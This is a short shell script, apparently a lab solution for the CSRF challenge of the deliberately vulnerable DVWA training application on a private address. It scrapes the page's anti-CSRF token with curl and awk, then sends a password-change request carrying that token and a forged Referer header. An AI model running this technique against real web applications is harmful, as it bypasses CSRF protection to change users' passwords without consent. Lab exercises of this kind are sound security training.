#Login with the found login
source ../levelled_login.sh high
#Check out the "CSRF" page
CSRFCSRF=$(curl -s -i -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" 192.168.178.98/dvwa/vulnerabilities/csrf/ | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" "192.168.178.98/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change&user_token=${CSRFCSRF}" -H "Referer: http://192.168.178.98/dvwa/vulnerabilities/csrf/" > result
unset LEVEL
unset SESSIONID
